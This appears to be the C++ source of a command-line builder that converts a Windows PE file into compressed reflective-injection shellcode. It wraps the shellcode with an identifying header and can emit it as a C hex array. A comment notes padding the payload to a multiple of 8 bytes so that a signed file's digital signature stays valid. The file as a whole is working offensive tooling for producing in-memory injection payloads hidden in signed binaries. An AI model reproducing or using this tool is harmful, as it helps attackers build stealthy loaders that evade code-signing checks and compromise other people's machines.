#include <win.h>
#include <rapidjson.h>
#include <zip++.h>
#include <reflecive.h>

int main(int argc, char** argv) {
	if (argc < 2) {
		std::cout << "Params invalid." << std::endl;
		return -1;
	}

	tfCommandLineNode param_map;
	shared::Win::ParseCommandLineParameters(argc, argv, param_map);

#if 0
	--input = $(SolutionDir)..\..\bin\shared\x64\Release\$(TargetName)$(TargetExt)
		--output = $(SolutionDir)..\..\projects\$(ProjectName)\res\$(TargetName)$(TargetExt).cppshellcode
		--appinitFunction = api_object_setup
		--compress = 1
		--simple = 0
		--identify = { 42FB368D_8B70_4483_BEC8_DD4B06590D99 }
		--routes = obj1, obj2, obj3, obj8,
#endif
		if (param_map.empty())
			return -1;

	bool result = false;
	shared::PEAdditionalDataHead PEDataHead;
	//!@ 不生成shellcode 
	bool no_shellcode = param_map.find("--no-shellcode")!= param_map.end();
	do {
		if (!no_shellcode)
			break;
		int enable = ::atoi(param_map["--no-shellcode"].c_str());
		if (enable == 0) {
			no_shellcode = false;
			break;
		}
		auto input = param_map["--input"];
		auto output = param_map["--output"];
		if (!shared::Win::AccessA(input))
			break;
		auto input_buffer = shared::Win::File::Read(input);
		if (input_buffer.empty())
			break;
		std::string out_buffer;
		bool zip = ::atoi(param_map["--zip"].c_str())==1?true:false;
		if (zip) {
			if (Z_OK != shared::Zip::zipCompress(input_buffer, out_buffer))
				break;
		}

		PEDataHead.size_pe = static_cast<unsigned long>(input_buffer.size());
		PEDataHead.size_shellcode_original = PEDataHead.size_pe;
		PEDataHead.size_shellcode_process = static_cast<decltype(PEDataHead.size_shellcode_process)>(out_buffer.size());
		PEDataHead.size_data = PEDataHead.size_shellcode_process;
		PEDataHead.size_total = sizeof(PEDataHead) + PEDataHead.size_data - sizeof(PEDataHead.data);
		auto data_buffer = new char[PEDataHead.size_total];
		::memcpy(data_buffer, &PEDataHead, sizeof(PEDataHead));
		auto pHead = (shared::PEAdditionalDataHead*)data_buffer;
		::memcpy(&pHead->data[0], out_buffer.data(), out_buffer.size());

		std::string FinalData(data_buffer, PEDataHead.size_total);

		if (!shared::Win::File::Write(output, FinalData))
			break;

		result = true;
	} while (0);

	if (no_shellcode)
		return 0;

	std::string InputFilePathname = param_map["--input"];

	if (InputFilePathname.empty())
		return -1;


	tfRoutePak routePak;
	tfRouteRes routeRes;
	do {
		auto found = param_map.find("--routes");
		if (found == param_map.end())
			break;
		std::cout << param_map["--routes"] << std::endl;
		std::vector<std::string> files;
		shared::Win::File::ParseA(param_map["--routes"], ',', files);
		if (files.empty())
			break;
		for (const auto& file : files) {
			auto data = shared::Win::File::Read(file);
			if (data.empty()) {
				std::cout << std::format("file({}) and data is empty.", file) << std::endl;
				continue;
			}
			std::cout << std::format("open file({}) and data size({}).", file, data.size()) << std::endl;
			routeRes.emplace(static_cast<unsigned long>(routeRes.size()), data);
		}
		if (routeRes.empty())
			break;
		if (!shared::Win::Resource::MadeRoute(routeRes, routePak))
			break;
	} while (0);

	bool CHexBuffer = ::atoi(param_map["--cbuffer"].c_str()) != 0;
	bool Compress = ::atoi(param_map["--compress"].c_str()) != 0;
	Compress = true;//!@ Must be compressed
	std::string Identify = param_map["--identify"];
	std::string OutputFilePathname = param_map["--output"];
	std::string AppinitFunction = param_map["--appinitfunction"];

	if (AppinitFunction.empty())
		AppinitFunction = "api_object_init";
	if (OutputFilePathname.empty()) {
		OutputFilePathname =
			shared::Win::PathFixedA(
				shared::Win::GetPathByPathnameA(InputFilePathname) + "\\" + shared::Win::GetNameByPathnameA(InputFilePathname) + ".cppshellcode");
	}
	shared::Win::CreateDirectoryA(shared::Win::GetPathByPathnameA(OutputFilePathname));

	if (Identify.size() == sizeof(shared::PEAdditionalDataHead::search_identify)) {
		::memcpy(PEDataHead.search_identify, Identify.data(), sizeof(PEDataHead.search_identify));
	}

	std::string shell_code;
	std::string shell_code_process;
	std::string final_buffer_varname;
	std::string final_cbuffer_headfilename;
	char* data_buffer = nullptr;
	do {
		if (!shared::Win::AccessA(InputFilePathname)) {
			std::cout << std::format("not found target pe file({}).", InputFilePathname) << std::endl;
			break;
		}

		std::string targetPEBuffer = shared::Win::File::Read(InputFilePathname);
		if (!shared::Win::PE::Verify(targetPEBuffer)) {
			std::cout << std::format("Input pe file invalid and size({}).", targetPEBuffer.size()) << std::endl;
			break;
		}

		PEDataHead.size_pe = static_cast<unsigned long>(targetPEBuffer.size());

		char* generate_shellcode = nullptr;
		if (!shared::injection::Reflecive::GenerateShellcode(
			(void*)targetPEBuffer.data(),
			static_cast<DWORD>(targetPEBuffer.size()),
			shared::injection::Reflecive::HashFunctionName(AppinitFunction.c_str()),
			routePak.empty() ? nullptr : routePak.data(),
			static_cast<DWORD>(routePak.size()),
			shared::injection::EnShellCodeFlag::EN_SC_CLEARHEADER,
			generate_shellcode, PEDataHead.size_shellcode_original))
			break;
		shell_code.append(generate_shellcode, PEDataHead.size_shellcode_original);
		SK_DELETE_PTR_C(generate_shellcode);

		//!@ 简约版
		bool simple = ::atoi(param_map["--simple"].c_str()) != 0;
		if (simple) {
			result = shared::Win::File::Write(OutputFilePathname, shell_code);
			return 0;
		}

		if (Z_OK != shared::Zip::zipCompress(shell_code, shell_code_process))
			break;
		PEDataHead.size_shellcode_process = static_cast<decltype(PEDataHead.size_shellcode_process)>(shell_code_process.size());
		PEDataHead.size_data = PEDataHead.size_shellcode_process;
		PEDataHead.size_total = sizeof(PEDataHead) + PEDataHead.size_data - sizeof(PEDataHead.data);
		data_buffer = new char[PEDataHead.size_total];
		::memcpy(data_buffer, &PEDataHead, sizeof(PEDataHead));
		auto pHead = (shared::PEAdditionalDataHead*)data_buffer;
		::memcpy(&pHead->data[0], shell_code_process.data(), shell_code_process.size());

		std::string FinalData(data_buffer, PEDataHead.size_total);
		do {//generate c head file.h
			if (!CHexBuffer || FinalData.empty())
				break;
			final_buffer_varname = shared::Win::GetNameByPathnameA(OutputFilePathname);
			final_buffer_varname.insert(0, "_");
			for (auto it = final_buffer_varname.begin(); it != final_buffer_varname.end();) {
				if (*it == '.')
					it = final_buffer_varname.erase(it);
				else
					++it;
			}
			std::string final_buffer = shared::Win::GenerateHexBuffer(FinalData, final_buffer_varname, ",");
			if (final_buffer.empty())
				break;
			FinalData = final_buffer;
			//!@ final head file name
			final_cbuffer_headfilename = shared::Win::GetNameByPathnameA(OutputFilePathname);
			for (auto it = final_cbuffer_headfilename.begin(); it != final_cbuffer_headfilename.end();) {
				if (*it == '.')
					it = final_cbuffer_headfilename.erase(it);
				else
					++it;
			}
			final_cbuffer_headfilename.insert(0, 1,'_');
			final_cbuffer_headfilename.append(".h");
			OutputFilePathname = shared::Win::PathFixedA(shared::Win::GetPathByPathnameA(OutputFilePathname) + "\\" + final_cbuffer_headfilename);
		} while (0);

		::remove(OutputFilePathname.c_str());


		//!@****** 对添加payload的长度限制做了修正，payload长度需要满足是8的倍数，否则数字签名状态无效(感谢维一零的帮助)

		if (!shared::Win::File::Write(OutputFilePathname, FinalData))
			break;
		result = true;
	} while (0);
	 

	if (result) {
		if (!final_cbuffer_headfilename.empty())
			std::cout << std::format("Output c head file name is ({}).", final_cbuffer_headfilename) << std::endl;
		if (!final_buffer_varname.empty())
			std::cout << std::format("Output c head buffer var name is ({}).", final_buffer_varname) << std::endl;
		std::cout << std::format("Input pe file({}).", InputFilePathname) << std::endl;
		std::cout << std::format("Input pe buffer size({}).", PEDataHead.size_pe) << std::endl;
		std::cout << std::format("Output shellcode file({}).", OutputFilePathname) << std::endl;
		std::cout << std::format("Output shellcode original size({}).", PEDataHead.size_shellcode_original) << std::endl;
		std::cout << std::format("Output shellcode process size({}).", PEDataHead.size_shellcode_process) << std::endl;
		std::cout << std::format("Input route data count({}) total size({}).", routeRes.size(), routePak.size()) << std::endl;
		std::cout << std::format("Output final data size({}).", PEDataHead.size_total) << std::endl;
		std::cout << std::format("Shellcode AppinitFunction({}).", AppinitFunction) << std::endl;
	}

	SK_DELETE_PTR_BUFFER(data_buffer);
	std::cout << std::format("Final result({})", result ? "success" : "failed") << std::endl;

	return 0;
}
